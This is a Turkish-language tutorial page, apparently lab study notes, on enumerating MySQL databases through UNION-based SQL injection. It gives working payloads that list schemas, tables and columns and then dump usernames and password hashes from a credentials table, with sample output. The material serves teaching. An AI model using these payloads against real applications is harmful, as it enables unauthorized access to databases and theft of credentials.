# Database Enumeration

## DBMS Fingerprinting

=== "VERSION"

    Tam sorgu çıktısı mümkün olduğunda kullanılır:

    ```sql title="Payload"
    SELECT @@version
    ```

    | MySQL | MSSQL | Others |
    |---|---|---|
    | Versiyon | Versiyon | Hata |

=== "POW"

    Yalnızca sayısal sorgu çıktısı mümkün olduğunda kullanılır:

    ```sql title="Payload"
    SELECT POW(1, 1)
    ```

    | MySQL | MSSQL | Others |
    |---|---|---|
    | 1 | Hata | Hata |

## INFORMATION_SCHEMA Database

INFORMATION_SCHEMA veri tabanı, sunucuda bulunan veri tabanları ve tablolara ait üst verileri içerir.

Eksiksiz bir SELECT sorgusu için aşağıda verilen bilgilere ihtiyaç duyulur:

1. Veri tabanlarının bir listesi (SCHEMATA)
2. Her bir veri tabanındaki tabloların listesi (TABLES)
3. Her bir tablodaki sütunların listesi (COLUMNS)

### SCHEMATA

SCHEMATA tablosu, sunucuda bulunan tüm veri tabanlarına ait bilgileri içerir.

| COLUMN | DESCRIPTION |
|---|---|
| SCHEMA_NAME | Mevcut olan tüm veri tabanı adlarını içerir. |

```mysql
MariaDB [(none)]> SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
```

```output title="Output"
+--------------------+
| SCHEMA_NAME        |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| dev                |
| ilfreight          |
+--------------------+
5 rows in set (0.001 sec)
```

!!! tip

    Aşağıda verilen veri tabanları varsayılan MySQL veri tabanlarıdır:

    * information_schema
    * mysql
    * performance_schema

Aşağıda verilen enjeksiyonu kullanalım:

```sql title="Payload"
CN' UNION SELECT 1,SCHEMA_NAME,3,4 FROM INFORMATION_SCHEMA.SCHEMATA-- -
```

| PORT CODE |
|---|
| information_schema |
| mysql |
| performance_schema |
| dev |
| ilfreight |

Web uygulamasının hangi veri tabanını kullandığını bulmak için DATABASE() fonksiyonunu kullanabiliriz:

```sql title="Payload"
CN' UNION SELECT 1,DATABASE(),3,4-- -
```

### TABLES

TABLES tablosu, veri tabanlarında bulunan tüm tablolara ait bilgileri içerir.

| COLUMN | DESCRIPTION |
|---|---|
| TABLE_NAME | Tablo adlarını içerir. |
| TABLE_SCHEMA | Her tablonun ait olduğu veri tabanı bilgisini içerir. |

Aşağıda verilen enjeksiyonu kullanalım (WHERE ile sonuçlar sınırlandı):

```sql title="Payload"
CN' UNION SELECT 1,TABLE_NAME,TABLE_SCHEMA,4 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = "dev"-- -
```

| PORT CODE | PORT CITY |
|---|---|
| credentials | dev |
| framework | dev |
| pages | dev |
| posts | dev |

### COLUMNS

COLUMNS tablosu, veri tabanlarında bulunan tüm sütunlara ait bilgileri içerir.

| COLUMN | DESCRIPTION |
|---|---|
| COLUMN_NAME | Sütun adlarını içerir. |

Aşağıda verilen enjeksiyonu kullanalım:

```sql title="Payload"
CN' UNION SELECT 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = "credentials"-- -
```

| PORT CODE | PORT CITY | PORT VOLUME |
|---|---|---|
| username | credentials | dev |
| password | credentials | dev |

## Data

Numaralandırma sonucu elde edilen tüm bilgileri birleştirerek aşağıda verilen enjeksiyonu kullanalım:

```sql title="Payload"
CN' UNION SELECT 1,username,password,4 FROM dev.credentials-- -
```

| PORT CODE | PORT CITY |
|---|---|
| admin | 5f4dcc3b5aa765d61d8327deb882cf99 |
| dev_admin | 47e761039fd8ba3705d38142eaffbdd5 |
| api_key | MzkyMDM3ZGJiYTUxZjY5Mjc3NmQ2Y2VmYjZkZDU0NmQglC0K |
| software_engineer | 392037dbba51f692776d6cefb6dd546d |
